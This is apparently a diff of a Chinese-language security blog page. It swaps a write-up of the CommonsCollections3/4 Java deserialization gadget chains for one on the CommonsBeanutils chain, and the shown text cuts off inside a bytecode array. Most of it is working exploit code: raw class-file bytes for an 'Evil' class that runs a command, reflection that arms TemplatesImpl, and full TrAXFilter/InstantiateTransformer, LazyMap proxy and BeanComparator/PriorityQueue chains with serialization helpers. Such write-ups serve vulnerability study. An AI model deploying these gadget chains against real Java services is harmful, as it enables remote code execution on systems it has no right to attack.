@@ -3,7 +3,7 @@
 <html lang="en">
 <head>
     <meta charset="utf-8" />
-    <title>CommonsCollections3 4 | Arcueid&#39;s BLOG</title>
+    <title>CB链 分析 | Arcueid&#39;s BLOG</title>
     <meta name="author" content="Arcueid" />
     <meta name="description" content="" />
     <meta name="keywords" content="" />
@@ -155,14 +155,14 @@
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
             <div class="article">
     <div>
-        <h1>CommonsCollections3 4</h1>
+        <h1>CB链 分析</h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2024/3/3
+            2024/4/22
         </span>
         
         
@@ -174,7 +174,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/java/" style="color: #ff7d73">java</a>
+                <a href="/tags/java/" style="color: #ffa2c4">java</a>
             </span>
             
         </span>
@@ -182,93 +182,37 @@
     </div>
     
     <div class="content" v-pre>
-        <h1 id="cc3"><a href="#cc3" class="headerlink" title="cc3"></a>cc3</h1><p>ysoserial上写到</p>
-<pre><code> * Variation on CommonsCollections1 that uses InstantiateTransformer instead of
- * InvokerTransformer.
-</code></pre>
-<p>在cc1的基础上 将InstantiateTransformer替换InvokerTransformer</p>
-<p>那么别的地方照抄</p>
-<p>我们看看InstantiateTransformer是怎么回事</p>
-<p>InstantiateTransformer#transform</p>
-<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202402241039413.png" alt="image-20240224103945270"></p>
-<p>实例化input</p>
-<p>其中的iParamTypes 和 iArgs 通过</p>
-<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030755274.png" alt="image-20240224104055577"></p>
-<p>写个demo</p>
-<pre><code class="java">        Transformer instance = InstantiateTransformer.getInstance(new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;hahaha&quot;&#125;);
-        System.out.println(instance.transform(String.class));
-</code></pre>
-<span id="more"></span> 
+        <h1 id="CB链"><a href="#CB链" class="headerlink" title="CB链"></a>CB链</h1><p>PropertyUtils.getProperty 可以进行一个对属性的get</p>
+<p>其中这个属性是可控的</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404300912126.png" alt="image-20240430091219035"></p>
+<p>当复合规范的javaBean (实现了getName方法) 存在的时候 就可以正常调用</p>
+<p>不存在时报错</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404300913040.png" alt="image-20240430091341958"></p>
+<p>那么针对这个传入的beans 如果是某个精心构造对象 其存在getXxxxx这样的方法 我们就可以</p>
+<p>考虑TemplatesImpl#getOutputProperties</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404300923905.png" alt="image-20240430092310829"></p>
+<p>其内调用了newTransformer</p>
+<p>而我们在cc的学习中知道newTransformer是可以动态加载类的</p>
+<p>也就是可以代码执行</p>
+<span id="more"></span>
 
-<p>然后正式开始跟链子</p>
-<p>cc3是靠defineClass加载字节码来触发的</p>
-<p>触发点在Classloader#definClass()</p>
-<p>所以我们要找谁调了defineClass</p>
-<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030755103.png" alt="image-20240224114836243"></p>
-<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030755299.png" alt="image-20240224114854562"></p>
-<p><code>TemplatesImpl</code>的内部类<code>TransletClassLoader</code>调用了defineClass</p>
-<p><code>TransletClassLoader#defineTransletClasses</code></p>
-<p>往前 <code>TemplatesImpl#getTransletInstance</code></p>
-<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030755234.png" alt="image-20240224115312589"></p>
-<p>往前 <code>TemplatesImpl#newTransformer</code></p>
-<p>这个方法是public的 在这就可以停了</p>
-<p>我们写个demo测一下 _name要非空</p>
-<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030755013.png" alt="image-20240224120948653"></p>
-<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030755869.png" alt="image-20240224121105176"></p>
-<p>这里<code>_tfactory</code>要非空 不然nullPointer</p>
-<pre><code class="java">        byte[][] _bytecodes = new byte[][]&#123;&#123;-54, -2, -70, -66, 0, 0, 0, 52, 0, 40, 10, 0, 9, 0, 24, 10, 0, 25, 0, 26, 8, 0, 27, 10, 0, 25, 0, 28, 7, 0, 29, 7, 0, 30, 10, 0, 6, 0, 31, 7, 0, 32, 7, 0, 33, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 6, 76, 69, 118, 105, 108, 59, 1, 0, 8, 60, 99, 108, 105, 110, 105, 116, 62, 1, 0, 1, 101, 1, 0, 21, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 59, 1, 0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, 29, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 9, 69, 118, 105, 108, 46, 106, 97, 118, 97, 12, 0, 10, 0, 11, 7, 0, 34, 12, 0, 35, 0, 36, 1, 0, 4, 99, 97, 108, 99, 12, 0, 37, 0, 38, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 26, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 69, 120, 99, 101, 112, 116, 105, 111, 110, 12, 0, 10, 0, 39, 1, 0, 4, 69, 118, 105, 108, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 1, 0, 10, 103, 101, 116, 82, 117, 110, 116, 105, 109, 101, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 59, 1, 0, 4, 101, 120, 101, 99, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 1, 0, 24, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 84, 104, 114, 111, 119, 97, 98, 108, 101, 59, 41, 86, 0, 33, 0, 8, 0, 9, 0, 0, 0, 0, 0, 2, 0, 1, 0, 10, 0, 11, 0, 1, 0, 12, 0, 0, 0, 47, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 2, 0, 13, 0, 0, 0, 6, 0, 1, 0, 0, 0, 3, 0, 14, 0, 0, 0, 12, 0, 1, 0, 0, 0, 5, 0, 15, 0, 16, 0, 0, 0, 8, 0, 17, 0, 11, 0, 1, 0, 12, 0, 0, 0, 102, 0, 3, 0, 1, 0, 0, 0, 23, -72, 0, 2, 18, 3, -74, 0, 4, 87, -89, 0, 13, 75, -69, 0, 6, 89, 42, -73, 0, 7, -65, -79, 0, 1, 0, 0, 0, 9, 0, 12, 0, 5, 0, 3, 0, 13, 0, 0, 0, 22, 0, 5, 0, 0, 0, 6, 0, 9, 0, 9, 0, 12, 0, 7, 0, 13, 0, 8, 0, 22, 0, 10, 0, 14, 0, 0, 0, 12, 0, 1, 0, 13, 0, 9, 0, 18, 0, 19, 0, 0, 0, 20, 0, 0, 0, 7, 0, 2, 76, 7, 0, 21, 9, 0, 1, 0, 22, 0, 0, 0, 2, 0, 23, &#125;&#125;;
-        TemplatesImpl templates = new TemplatesImpl();
-        Field fieldBytecodes = templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);
-        Field fieldName = templates.getClass().getDeclaredField(&quot;_name&quot;);
-        Field fieldTfactory = templates.getClass().getDeclaredField(&quot;_tfactory&quot;);
-        fieldBytecodes.setAccessible(true);
-        fieldName.setAccessible(true);
-        fieldTfactory.setAccessible(true);
-        fieldBytecodes.set(templates,_bytecodes);
-        fieldName.set(templates,&quot;aa&quot;);
-        fieldTfactory.set(templates,new TransformerFactoryImpl());
+<p>那么我们尝试构造下半段链子</p>
+<pre><code class="java">package com.arcueid;
 
-        templates.newTransformer();
-</code></pre>
-<p>尝试运行 发现不行 确实是跟到defineclass里面了 但是没有弹计算器</p>
-<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030755630.png" alt="image-20240224122910769"></p>
-<p>这里Evil类要继承com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</p>
-<p>修改后测试成功</p>
-<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030755271.png" alt="image-20240224123124553"></p>
-<p>TemplatesImpl 实现了 Serializable接口</p>
-<p>后面和cc1差不多 改改就能用了</p>
-<p>这里还要继续找谁调了<code>newTransformer</code></p>
-<p>在<code>TrAXFilter</code>的构造函数中调了</p>
-<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030755142.png" alt="image-20240224123954328"></p>
-<p>结合之前说的InstantiateTransformer可以进行实例化 于是transformers如下</p>
-<pre><code class="java">Transformer[] transformers = new Transformer[]&#123;
-            new ConstantTransformer(TrAXFilter.class),
-            new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)
-        &#125;;
-</code></pre>
-<pre><code class="java">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-import org.apache.commons.collections.functors.ChainedTransformer;
-import org.apache.commons.collections.functors.ConstantTransformer;
-import org.apache.commons.collections.functors.InstantiateTransformer;
-import org.apache.commons.collections.map.LazyMap;
-import org.apache.commons.collections.map.TransformedMap;
-import org.apache.commons.collections.Transformer;
+import org.apache.commons.beanutils.PropertyUtils;
 
-import javax.xml.transform.Templates;
-import javax.xml.transform.TransformerConfigurationException;
-import javax.xml.ws.Action;
-import java.io.*;
-import java.lang.reflect.*;
-import java.util.HashMap;
-import java.util.Map;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
 
-public class CC3 &#123;
-    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, TransformerConfigurationException, NoSuchFieldException, IOException &#123;
-        HashMap hashMap = new HashMap();
-        hashMap.put(&quot;fault&quot;,&quot;fault&quot;);
-
+/**
+ * Hello world!
+ *
+ */
+public class App 
+&#123;
+    public static void main( String[] args ) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException &#123;
 
         byte[][] _bytecodes = new byte[][]&#123;&#123;-54, -2, -70, -66, 0, 0, 0, 52, 0, 54, 10, 0, 9, 0, 37, 10, 0, 38, 0, 39, 8, 0, 40, 10, 0, 38, 0, 41, 7, 0, 42, 7, 0, 43, 10, 0, 6, 0, 44, 7, 0, 45, 7, 0, 46, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 6, 76, 69, 118, 105, 108, 59, 1, 0, 9, 116, 114, 97, 110, 115, 102, 111, 114, 109, 1, 0, 114, 40, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 91, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 41, 86, 1, 0, 8, 100, 111, 99, 117, 109, 101, 110, 116, 1, 0, 45, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 1, 0, 8, 104, 97, 110, 100, 108, 101, 114, 115, 1, 0, 66, 91, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 1, 0, 10, 69, 120, 99, 101, 112, 116, 105, 111, 110, 115, 7, 0, 47, 1, 0, -90, 40, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 100, 116, 109, 47, 68, 84, 77, 65, 120, 105, 115, 73, 116, 101, 114, 97, 116, 111, 114, 59, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 41, 86, 1, 0, 8, 105, 116, 101, 114, 97, 116, 111, 114, 1, 0, 53, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 100, 116, 109, 47, 68, 84, 77, 65, 120, 105, 115, 73, 116, 101, 114, 97, 116, 111, 114, 59, 1, 0, 7, 104, 97, 110, 100, 108, 101, 114, 1, 0, 65, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 1, 0, 8, 60, 99, 108, 105, 110, 105, 116, 62, 1, 0, 1, 101, 1, 0, 21, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 59, 1, 0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, 42, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 9, 69, 118, 105, 108, 46, 106, 97, 118, 97, 12, 0, 10, 0, 11, 7, 0, 48, 12, 0, 49, 0, 50, 1, 0, 4, 99, 97, 108, 99, 12, 0, 51, 0, 52, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 26, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 69, 120, 99, 101, 112, 116, 105, 111, 110, 12, 0, 10, 0, 53, 1, 0, 4, 69, 118, 105, 108, 1, 0, 64, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 114, 117, 110, 116, 105, 109, 101, 47, 65, 98, 115, 116, 114, 97, 99, 116, 84, 114, 97, 110, 115, 108, 101, 116, 1, 0, 57, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 84, 114, 97, 110, 115, 108, 101, 116, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 1, 0, 10, 103, 101, 116, 82, 117, 110, 116, 105, 109, 101, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 59, 1, 0, 4, 101, 120, 101, 99, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 1, 0, 24, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 84, 104, 114, 111, 119, 97, 98, 108, 101, 59, 41, 86, 0, 33, 0, 8, 0, 9, 0, 0, 0, 0, 0, 4, 0, 1, 0, 10, 0, 11, 0, 1, 0, 12, 0, 0, 0, 47, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 2, 0, 13, 0, 0, 0, 6, 0, 1, 0, 0, 0, 9, 0, 14, 0, 0, 0, 12, 0, 1, 0, 0, 0, 5, 0, 15, 0, 16, 0, 0, 0, 1, 0, 17, 0, 18, 0, 2, 0, 12, 0, 0, 0, 63, 0, 0, 0, 3, 0, 0, 0, 1, -79, 0, 0, 0, 2, 0, 13, 0, 0, 0, 6, 0, 1, 0, 0, 0, 21, 0, 14, 0, 0, 0, 32, 0, 3, 0, 0, 0, 1, 0, 15, 0, 16, 0, 0, 0, 0, 0, 1, 0, 19, 0, 20, 0, 1, 0, 0, 0, 1, 0, 21, 0, 22, 0, 2, 0, 23, 0, 0, 0, 4, 0, 1, 0, 24, 0, 1, 0, 17, 0, 25, 0, 2, 0, 12, 0, 0, 0, 73, 0, 0, 0, 4, 0, 0, 0, 1, -79, 0, 0, 0, 2, 0, 13, 0, 0, 0, 6, 0, 1, 0, 0, 0, 26, 0, 14, 0, 0, 0, 42, 0, 4, 0, 0, 0, 1, 0, 15, 0, 16, 0, 0, 0, 0, 0, 1, 0, 19, 0, 20, 0, 1, 0, 0, 0, 1, 0, 26, 0, 27, 0, 2, 0, 0, 0, 1, 0, 28, 0, 29, 0, 3, 0, 23, 0, 0, 0, 4, 0, 1, 0, 24, 0, 8, 0, 30, 0, 11, 0, 1, 0, 12, 0, 0, 0, 102, 0, 3, 0, 1, 0, 0, 0, 23, -72, 0, 2, 18, 3, -74, 0, 4, 87, -89, 0, 13, 75, -69, 0, 6, 89, 42, -73, 0, 7, -65, -79, 0, 1, 0, 0, 0, 9, 0, 12, 0, 5, 0, 3, 0, 13, 0, 0, 0, 22, 0, 5, 0, 0, 0, 12, 0, 9, 0, 15, 0, 12, 0, 13, 0, 13, 0, 14, 0, 22, 0, 16, 0, 14, 0, 0, 0, 12, 0, 1, 0, 13, 0, 9, 0, 31, 0, 32, 0, 0, 0, 33, 0, 0, 0, 7, 0, 2, 76, 7, 0, 34, 9, 0, 1, 0, 35, 0, 0, 0, 2, 0, 36, &#125;&#125;;
         TemplatesImpl templates = new TemplatesImpl();
@@ -282,112 +226,45 @@ public class CC3 &#123;
         fieldName.set(templates,&quot;aa&quot;);
         fieldTfactory.set(templates,new TransformerFactoryImpl());
 
-
-
-        Transformer[] transformers = new Transformer[]&#123;
-            new ConstantTransformer(TrAXFilter.class),
-            new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)
-        &#125;;
-        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
-
-
-        Map&lt;Object,Object&gt; decoratedMap = TransformedMap.decorate(hashMap, new ConstantTransformer(1), chainedTransformer);
-
-        Class&lt;?&gt; AIHClazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
-        Constructor&lt;?&gt; constructor = AIHClazz.
-                getDeclaredConstructor(new Class[]&#123;Class.class, Map.class&#125;);
-        constructor.setAccessible(true);
-        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Action.class, decoratedMap);
-
-        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap,chainedTransformer);
-
-        Map finalMap = (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(), invocationHandler);
-
-        Object object =  constructor.newInstance(Action.class, finalMap);
-
-        byte[] bytes = serialize(templates);
-        unSerialize(bytes);
-
-
-
-    &#125;
-
-
-
-    public static byte[] serialize(Object obj) throws IOException &#123;
-        ByteArrayOutputStream baos = new ByteArrayOutputStream();
-        ObjectOutputStream oos = new ObjectOutputStream(baos);
-        oos.writeObject(obj);
-        return baos.toByteArray();
-    &#125;
-
-    public static Object unSerialize(byte[] bytes) throws IOException, ClassNotFoundException &#123;
-        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
-        return  ois.readObject();
-    &#125;
-&#125;
-</code></pre>
-<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030755794.png" alt="image-20240224124450342"></p>
-<p>evil.java如下</p>
-<pre><code class="java">import com.sun.org.apache.xalan.internal.xsltc.DOM;
-import com.sun.org.apache.xalan.internal.xsltc.TransletException;
-import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
-import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
-import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
-
-import java.io.IOException;
-
-public class Evil extends AbstractTranslet &#123;
-    static &#123;
-        try &#123;
-            Runtime.getRuntime().exec(&quot;calc&quot;);
-        &#125; catch (IOException e) &#123;
-            throw new RuntimeException(e);
-        &#125;
-    &#125;
-
-    @Override
-    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;
-
-    &#125;
-
-    @Override
-    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;
+        PropertyUtils.getProperty(templates, &quot;outputProperties&quot;);
 
     &#125;
 &#125;
 </code></pre>
-<h1 id="cc4"><a href="#cc4" class="headerlink" title="cc4"></a>cc4</h1><p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030755444.png" alt="image-20240302234706356"></p>
-<p>相较于CC2 使用了InstantiateTransformer 代替 InvokerTransformer</p>
-<p>类似cc3和cc1的关系</p>
-<pre><code>Gadget chain:
-    ObjectInputStream.readObject()
-        PriorityQueue.readObject()
-            ...
-                TransformingComparator.compare()
-                    InstantiateTransformer.transform()
-                        TemplatesImpl.newTransformer()
-                            getTransletInstance()
-                                defineTransletClasses()
-                                    defineClass()
-</code></pre>
-<p>链子拼一下就好了</p>
-<pre><code class="java">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404301252640.png" alt="image-20240430125221089"></p>
+<p>现在考虑把前半段补上</p>
+<p>去看谁调用了<em>getProperty</em></p>
+<p>BeanComparator#compare</p>
+<p>然后compare往上和之前的PriorityQueue一样</p>
+<p>我们来看compare中的property属性是在哪儿赋值的</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404301542307.png" alt="image-20240430154233157"></p>
+<p>所以在这里考虑用这个构造方法</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202404301541154.png" alt="image-20240430154147841"></p>
+<p>这里第二个参数需要实现Serializable接口</p>
+<p>我们使用自带的AttrCompare</p>
+<pre><code class="py">package com.arcueid;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-import org.apache.commons.collections4.Transformer;
-import org.apache.commons.collections4.comparators.TransformingComparator;
-import org.apache.commons.collections4.functors.ChainedTransformer;
-import org.apache.commons.collections4.functors.ConstantTransformer;
-import org.apache.commons.collections4.functors.InstantiateTransformer;
+import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
+import org.apache.commons.beanutils.BeanComparator;
+import org.apache.commons.beanutils.PropertyUtils;
+import org.w3c.dom.Attr;
 
-import javax.xml.transform.Templates;
 import java.io.*;
 import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.util.Comparator;
 import java.util.PriorityQueue;
 
-public class CC4 &#123;
-    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;
+/**
+ * Hello world!
+ *
+ */
+public class App 
+&#123;
+    public static void main( String[] args ) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, IOException, ClassNotFoundException &#123;
+
         byte[][] _bytecodes = new byte[][]&#123;&#123;-54, -2, -70, -66, 0, 0, 0, 52, 0, 54, 10, 0, 9, 0, 37, 10, 0, 38, 0, 39, 8, 0, 40, 10, 0, 38, 0, 41, 7, 0, 42, 7, 0, 43, 10, 0, 6, 0, 44, 7, 0, 45, 7, 0, 46, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 6, 76, 69, 118, 105, 108, 59, 1, 0, 9, 116, 114, 97, 110, 115, 102, 111, 114, 109, 1, 0, 114, 40, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 91, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 41, 86, 1, 0, 8, 100, 111, 99, 117, 109, 101, 110, 116, 1, 0, 45, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 1, 0, 8, 104, 97, 110, 100, 108, 101, 114, 115, 1, 0, 66, 91, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 1, 0, 10, 69, 120, 99, 101, 112, 116, 105, 111, 110, 115, 7, 0, 47, 1, 0, -90, 40, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 100, 116, 109, 47, 68, 84, 77, 65, 120, 105, 115, 73, 116, 101, 114, 97, 116, 111, 114, 59, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 41, 86, 1, 0, 8, 105, 116, 101, 114, 97, 116, 111, 114, 1, 0, 53, 76, 99, 111, 109, 